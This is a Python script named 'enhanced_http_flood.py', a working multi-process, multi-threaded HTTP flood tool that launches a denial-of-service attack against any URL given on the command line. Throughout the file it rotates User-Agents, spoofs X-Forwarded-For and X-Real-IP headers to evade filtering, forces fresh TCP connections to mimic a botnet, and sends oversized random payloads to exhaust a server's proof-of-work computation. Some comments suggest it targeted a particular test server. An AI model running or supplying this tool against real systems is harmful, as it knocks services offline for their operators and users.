# enhanced_http_flood.py - Enhanced Distributed HTTP Flood Attack

import requests
import threading
import time
import sys
import random
import string
import socket
import multiprocessing
from urllib.parse import urlparse

# --- Configuration ---
# Get target URL from command-line arguments
if len(sys.argv) < 2:
    print("Usage: python http_flood.py <URL> [thread_count] [process_count]")
    sys.exit(1)

target_url = sys.argv[1]
# Get thread count from command-line or use default
thread_count = int(sys.argv[2]) if len(sys.argv) > 2 else 100
# Get process count for multi-process distribution
process_count = int(sys.argv[3]) if len(sys.argv) > 3 else 2

print(f"Attacking {target_url} with {thread_count} threads across {process_count} processes.")

# Realistic User-Agent pool for request diversification
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15'
]

# HTTP methods for multi-vector attacks
http_methods = ['GET', 'POST', 'HEAD', 'OPTIONS']

# Target endpoints for diversified attacks
target_endpoints = ['/'] # can add here more target endpoints

# Global counters
successful_requests = 0
connection_count = 0
running = True

def generate_random_block_data():
    """
    Generates variable-size random data to exhaust server resources.
    Larger data increases memory pressure during proof-of-work computation.
    """
    # Vary data size significantly to test different resource consumption patterns
    base_length = random.randint(20, 100)
    
    # 20% chance for much larger payloads to increase memory pressure
    if random.random() < 0.2:
        base_length = random.randint(200, 500)
    
    # Mix of letters, numbers, and special characters
    chars = string.ascii_letters + string.digits + '_-.'
    
    # Generate random string
    random_data = ''.join(random.choice(chars) for _ in range(base_length))
    
    # Add realistic prefixes with higher variety
    prefixes = ['block_', 'tx_', 'data_', 'hash_', 'chain_', 'proof_', 'mine_', 'verify_']
    if random.random() < 0.4:  # 40% chance to add prefix
        random_data = random.choice(prefixes) + random_data
    
    return random_data

def create_distributed_session():
    """
    Creates a new session with forced connection distribution.
    Each session uses minimal connection pooling to force new TCP connections.
    """
    session = requests.Session()
    
    # Force minimal connection pooling - each request creates new connections
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=1,
        pool_maxsize=1,
        max_retries=0
    )
    session.mount('http://', adapter)
    
    return session

def generate_diversified_headers():
    """
    Generates randomized headers to simulate different clients and evade simple filtering.
    """
    headers = {
        'User-Agent': random.choice(user_agents),
        'Accept': random.choice([
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'application/json,text/plain,*/*',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        ]),
        'Accept-Language': random.choice([
            'en-US,en;q=0.9',
            'en-GB,en;q=0.8',
            'fr-FR,fr;q=0.9,en;q=0.8',
            'de-DE,de;q=0.9,en;q=0.8'
        ]),
        'Accept-Encoding': 'gzip, deflate',
        'Connection': random.choice(['keep-alive', 'close']),
        'Cache-Control': random.choice(['no-cache', 'max-age=0', 'no-store'])
    }
    
    # Add random custom headers occasionally
    if random.random() < 0.3:
        custom_headers = {
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Request-ID': ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
        }
        headers.update(random.choice(list(custom_headers.items())) for _ in range(random.randint(1, 2)))
    
    return headers

def distributed_attack():
    """
    Enhanced distributed attack function with multiple attack vectors.
    Uses diversified requests, connection management, and resource exhaustion techniques.
    """
    global successful_requests, connection_count
    
    # Create a distributed session for this thread
    session = create_distributed_session()
    
    while running:
        try:
            # Add random jitter between requests to simulate realistic traffic patterns
            if random.random() < 0.3:  # 30% chance for jitter
                time.sleep(random.uniform(0.1, 2.0))
            
            # Generate diversified headers for this request
            headers = generate_diversified_headers()
            
            # Choose attack vector - multi-vector approach
            endpoint = random.choice(target_endpoints)
            method = http_methods[0] # random.choice(http_methods) , currently we configure the server to handle only get requests...
            full_url = target_url.rstrip('/') + endpoint
            
            # Prepare request parameters
            if endpoint == '/':
                # High-computation endpoint - use variable-size block data
                block_data = generate_random_block_data()
                params = {'block_data': block_data}
                data = None
                
                # For POST requests, sometimes send data in body instead of params
                if method == 'POST' and random.random() < 0.5:
                    data = {'block_data': block_data}
                    params = None
            else:
                # Currently no other endpoints...
                params = None
                data = None
            
            connection_count += 1
            
            # Execute the request with chosen method
            if method == 'GET':
                response = session.get(full_url, headers=headers, params=params, timeout=10)
            elif method == 'POST':
                response = session.post(full_url, headers=headers, params=params, data=data, timeout=10)
            elif method == 'HEAD':
                response = session.head(full_url, headers=headers, params=params, timeout=10)
            elif method == 'OPTIONS':
                response = session.options(full_url, headers=headers, timeout=10)
            
            # Check for successful response
            if 200 <= response.status_code < 400:
                successful_requests += 1
                
                # Occasionally print computation details for main endpoint
                if endpoint == '/' and successful_requests % 50 == 0:
                    try:
                        if response.headers.get('content-type', '').startswith('application/json'):
                            result = response.json()
                            print(f"[{method}] Server computed: Block={result.get('block_data', '')[:15]}..., Nonce={result.get('nonce', 'N/A')}")
                    except:
                        pass
            # Force connection closure occasionally to make it look nore realistic botnet simulation
            if random.random() < 0.05:  # 5% chance
                session.close()
                session = create_distributed_session()
            

        except requests.exceptions.RequestException:
            # Handle timeouts, connection errors, etc.
            pass
        except Exception as e:
            # Handle any other unexpected errors
            pass

def enhanced_stats():
    """
    Provides comprehensive attack statistics including connection metrics.
    """
    global successful_requests, connection_count
    last_request_count = 0
    last_connection_count = 0
    
    while running:
        time.sleep(2)  # Update every 2 seconds for better visibility
        
        # Calculate rates
        current_requests = successful_requests
        current_connections = connection_count
        
        requests_per_second = (current_requests - last_request_count) / 2
        connections_per_second = (current_connections - last_connection_count) / 2
        
        print(f"Attack Status: Req/sec: {requests_per_second:.1f} | Conn/sec: {connections_per_second:.1f} | Total Req: {current_requests} | Total Conn: {current_connections}")
        
        last_request_count = current_requests
        last_connection_count = current_connections

def worker_process(worker_id, threads_per_process):
    """
    Worker process for multi-process distributed attacks.
    Each process runs its own set of threads to bypass Python GIL limitations.
    """
    print(f"Worker {worker_id} starting with {threads_per_process} threads")
    
    threads = []
    
    # Start fast distributed attack threads
    for _ in range(threads_per_process):
        thread = threading.Thread(target=distributed_attack, daemon=True)
        thread.start()
        threads.append(thread)
    
    # Keep worker process alive
    try:
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    print(f"Enhanced Distributed HTTP Flood Attack")
    print(f"Target: {target_url}")
    print(f"Configuration: {thread_count} threads across {process_count} processes")
    print(f"Attack vectors: Multi-method, Multi-endpoint, Variable payload sizes")
    print(f"Connection strategy: Distributed sessions, Forced new connections, Mixed timing patterns")
    print("-" * 80)
    
    # Start enhanced statistics thread
    stats_thread = threading.Thread(target=enhanced_stats, daemon=True)
    stats_thread.start()
    
    processes = []
    threads_per_process = thread_count // process_count
    
    try:
        if process_count > 1:
            # Multi-process execution for better distribution
            for i in range(process_count):
                process = multiprocessing.Process(
                    target=worker_process,
                    args=(i, threads_per_process)
                )
                process.start()
                processes.append(process)
            
            # Wait for all processes
            for process in processes:
                process.join()
                
        else:
            # Single process execution (fallback)
            threads = []
            
            # Start distributed attack threads
            for i in range(thread_count):
                thread = threading.Thread(target=distributed_attack)
                thread.start()
                threads.append(thread)
            
            # Wait for all threads
            for thread in threads:
                thread.join()
                
    except KeyboardInterrupt:
        print("\nStopping enhanced distributed attack...")
        running = False
        
        # Terminate processes if running multi-process
        if process_count > 1:
            for process in processes:
                if process.is_alive():
                    process.terminate()
                    process.join(timeout=2)
        
        time.sleep(2)
        print("Enhanced attack finished.")
        print(f"Final stats - Total requests: {successful_requests}, Total connections: {connection_count}")